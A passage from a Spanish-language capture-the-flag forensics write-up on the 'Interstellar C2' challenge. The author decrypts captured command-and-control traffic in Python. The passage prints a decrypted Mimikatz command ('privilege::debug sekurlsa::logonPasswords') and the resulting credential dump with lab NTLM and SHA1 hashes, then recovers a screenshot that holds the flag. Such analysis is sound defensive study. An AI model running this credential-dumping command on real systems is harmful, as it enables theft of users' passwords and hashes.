+b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x04\x00\x0b\xf7\x8d\x0f\xf0\x0fw\rr\n\xf2wtqv\x0c\x0e\xb1r\x0f\xf5t\x89\xf7\xf5\xf7\xf3\x0c\xf1\x0f\x82\xc8\xc5\xfb\xfbY\xf9\xe7\x01\x00\xa1\x98-%*\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+&gt;&gt;&gt; decompress(data)
+b'WM_POWERBROADCAST:GUID_MONITOR_POWER_ON:On'
+</code></pre></div><p>Bien, parece la salida de algo&mldr;</p><h3 id="cargando-mimikatz">Cargando Mimikatz</h3><p>Después de esto, hay algunas peticiones que no comprendo completamente. Sin embargo, después de algunos paquetes, vemos otra petición GET como las anteriores, con datos codificados en Base64 en la respuesta, justo antes de una petición POST:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-11.webp" alt="Interstellar C2 11"></p><p>Esto significa que el <em>payload</em> cifrado debe ser un comando para ejecutar en la máquina de la víctima. Descubrimos esto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; with open('franchette.b64') as f:
+...     enc = b64d(f.read())
+...
+&gt;&gt;&gt; iv, ct = enc[:16], enc[16:]
+&gt;&gt;&gt;
+&gt;&gt;&gt; cipher = AES.new(key, AES.MODE_CBC, iv)
+&gt;&gt;&gt;
+&gt;&gt;&gt; data = b64d(cipher.decrypt(ct))
+&gt;&gt;&gt; data[:20]
+b'multicmd00034loadmod'
+&gt;&gt;&gt; data[:100]
+b'multicmd00034loadmoduleTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+&gt;&gt;&gt; data[-100:]
+b'dll SharpSploit.Credentials.Mimikatz SharpSploit Command "privilege::debug sekurlsa::logonPasswords"'
+&gt;&gt;&gt; data[-120:]
+b'3dion@LD!-d00035run-dll SharpSploit.Credentials.Mimikatz SharpSploit Command "privilege::debug sekurlsa::logonPasswords"'  
+</code></pre></div><p>¡Oye, está tratando de ejecutar Mimikatz! Analicemos la quinta petición POST (<code>image5.png</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; with open('image5.png', 'rb') as f:
+...     img_data = f.read()
+...
+&gt;&gt;&gt; len(img_data[1500:])
+1008
+&gt;&gt;&gt; enc = img_data[1500:]
+&gt;&gt;&gt; iv, ct = enc[:16], enc[16:]
+&gt;&gt;&gt;
+&gt;&gt;&gt; cipher = AES.new(key, AES.MODE_CBC, iv)
+&gt;&gt;&gt;
+&gt;&gt;&gt; data = decompress(cipher.decrypt(ct))
+&gt;&gt;&gt; print(data.decode())
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  8 2021 10:31:14
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/  
+
+mimikatz(powershell) # privilege::debug
+Privilege '20' OK
+
+mimikatz(powershell) # sekurlsa::logonPasswords
+
+Authentication Id : 0 ; 1044643 (00000000:000ff0a3)
+Session           : Interactive from 1
+User Name         : IEUser
+Domain            : DESKTOP
+Logon Server      : DESKTOP
+Logon Time        : 3/7/2023 11:30:59 AM
+SID               : S-1-5-21-1281496067-1440983016-2272511217-1000
+	msv :
+	 [00000003] Primary
+	 * Username : IEUser
+	 * Domain   : DESKTOP
+	 * NTLM     : 69943c5e63b4d2c104dbbcc15138b72b
+	 * SHA1     : e91fe173f59b063d620a934ce1a010f2b114c1f3
+	tspkg :
+	wdigest :
+	 * Username : IEUser
+	 * Domain   : DESKTOP
+	 * Password : (null)
+	kerberos :
+	 * Username : IEUser
+	 * Domain   : DESKTOP
+	 * Password : (null)
+	ssp :
+	credman :
+	cloudap :	KO
+
+Authentication Id : 0 ; 1044605 (00000000:000ff07d)
+Session           : Interactive from 1
+User Name         : IEUser
+Domain            : DESKTOP
+Logon Server      : DESKTOP
+Logon Time        : 3/7/2023 11:30:59 AM
+SID               : S-1-5-21-1281496067-1440983016-2272511217-1000
+	msv :
+	 [00000003] Primary
+	 * Username : IEUser
+	 * Domain   : DESKTOP
+	 * NTLM     : 69943c5e63b4d2c104dbbcc15138b72b
+	 * SHA1     : e91fe173f59b063d620a934ce1a010f2b114c1f3
+	tspkg :
+	wdigest :
+	 * Username : IEUser
+	 * Domain   : DESKTOP
+	 * Password : (null)
+	kerberos :
+	 * Username : IEUser
+	 * Domain   : DESKTOP
+	 * Password : (null)
+	ssp :
+	credman :
+	cloudap :	KO
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 3/7/2023 11:30:00 AM
+SID               : S-1-5-19
+	msv :
+	tspkg :
+	wdigest :
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :
+	credman :
+	cloudap :	KO
+
+Authentication Id : 0 ; 72709 (00000000:00011c05)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/7/2023 11:30:00 AM
+SID               : S-1-5-90-0-1
+	msv :
+	tspkg :
+	wdigest :
+	 * Username : DESKTOP$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :
+	ssp :
+	credman :
+	cloudap :	KO
+
+Authentication Id : 0 ; 72631 (00000000:00011bb7)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/7/2023 11:30:00 AM
+SID               : S-1-5-90-0-1
+	msv :
+	tspkg :
+	wdigest :
+	 * Username : DESKTOP$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :
+	ssp :
+	credman :
+	cloudap :	KO
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 3/7/2023 11:30:00 AM
+SID               : S-1-5-20
+	msv :
+	tspkg :
+	wdigest :
+	 * Username : DESKTOP$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :
+	 * Username : desktop$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :
+	credman :
+	cloudap :	KO
+
+Authentication Id : 0 ; 50926 (00000000:0000c6ee)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/7/2023 11:29:59 AM
+SID               : S-1-5-96-0-0
+	msv :
+	tspkg :
+	wdigest :
+	 * Username : DESKTOP$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :
+	ssp :
+	credman :
+	cloudap :	KO
+
+Authentication Id : 0 ; 50925 (00000000:0000c6ed)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/7/2023 11:29:59 AM
+SID               : S-1-5-96-0-1
+	msv :
+	tspkg :
+	wdigest :
+	 * Username : DESKTOP$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :
+	ssp :
+	credman :
+	cloudap :	KO
+
+Authentication Id : 0 ; 49932 (00000000:0000c30c)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 3/7/2023 11:29:59 AM
+SID               :
+	msv :
+	tspkg :
+	wdigest :
+	kerberos :
+	ssp :
+	credman :
+	cloudap :	KO
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 3/7/2023 11:29:59 AM
+SID               : S-1-5-18
+	msv :
+	tspkg :
+	wdigest :
+	 * Username : DESKTOP$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :
+	 * Username : desktop$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :
+	credman :
+	cloudap :	KO
+</code></pre></div><p>Esto es simplemente hermoso, ¿no? ¡La salida de Mimikatz de arriba estaba oculta en esta imagen!</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-12.png" alt="Interstellar C2 12"></p><h3 id="tomando-capturas-de-pantalla">Tomando capturas de pantalla</h3><p>Ya estamos cerca del final:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-13.webp" alt="Interstellar C2 13"></p><p>Vamos a descifrar de nuevo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; with open('ciel.b64') as f:
+...     enc = b64d(f.read())
+...
+&gt;&gt;&gt; iv, ct = enc[:16], enc[16:]
+&gt;&gt;&gt;
+&gt;&gt;&gt; cipher = AES.new(key, AES.MODE_CBC, iv)  
+&gt;&gt;&gt;
+&gt;&gt;&gt; data = b64d(cipher.decrypt(ct))
+&gt;&gt;&gt; data
+b'multicmd00036get-screenshot'
+</code></pre></div><p>Bien, está tratando de ejecutar <code>get-screenshot</code>, y la salida debe venir en la última petición POST:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-14.webp" alt="Interstellar C2 14"></p><p>Desciframos una vez más:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; with open('image6.png', 'rb') as f:
+...     img_data = f.read()
+...
+&gt;&gt;&gt; len(img_data[1500:])
+845088
+&gt;&gt;&gt; enc = img_data[1500:]
+&gt;&gt;&gt; iv, ct = enc[:16], enc[16:]
+&gt;&gt;&gt;
+&gt;&gt;&gt; cipher = AES.new(key, AES.MODE_CBC, iv)  
+&gt;&gt;&gt;
+&gt;&gt;&gt; data = decompress(cipher.decrypt(ct))
+&gt;&gt;&gt; data[:20]
+b'iVBORw0KGgoAAAANSUhE'
+&gt;&gt;&gt; data[-20:]
+b'euHkAAAAAElFTkSuQmCC'
+</code></pre></div><p>Esta vez parecen datos codificados en Base64. Intentemos decodificarlo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; data = b64d(data)
+&gt;&gt;&gt; data[:20]
+b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x07z'
+&gt;&gt;&gt;
+&gt;&gt;&gt; with open('screenshot.png', 'wb') as f:  
+...     f.write(data)
+...
+847050
+</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>Muy bien, finalmente tenemos esta captura de pantalla:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-15.png" alt="Interstellar C2 15"></p><p>Y la <em>flag</em> aparece en la esquina superior derecha:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">HTB{h0w_c4N_y0U_s3e_p05H_c0mM4nd?}  
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#desofuscación-de-powershell">Desofuscación de PowerShell</a><ul><li><a href="#descifrando-el-ejecutable-de-_malware_">Descifrando el ejecutable de <em>malware</em></a></li></ul></li><li><a href="#descompilación-de-c-net">Descompilación de C# .NET</a></li><li><a href="#varios-descifrados">Varios descifrados</a><ul><li><a href="#ejecución-de-comandos">Ejecución de comandos</a></li><li><a href="#exfiltración-de-datos-a-través-de-imágenes-png">Exfiltración de datos a través de imágenes PNG</a></li><li><a href="#cargando-mimikatz">Cargando Mimikatz</a></li><li><a href="#tomando-capturas-de-pantalla">Tomando capturas de pantalla</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
